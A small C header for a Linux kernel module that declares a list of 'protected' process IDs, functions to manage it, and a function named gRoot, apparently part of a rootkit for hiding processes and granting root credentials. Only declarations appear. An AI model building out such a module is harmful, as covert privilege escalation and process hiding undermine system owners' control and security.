#ifndef PSY_UTIL_H
#define PSY_UTIL_H

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/kernel.h>

typedef struct pid_node {
    pid_t pid;
    struct pid_node *next;
} pid_node_t;

extern pid_node_t *protected_pids_head;

void addPid(pid_t pid);
void removePid(pid_t pid);
bool isProtected(pid_t pid);
void clearProtected(void);

void gRoot(void);

#endif
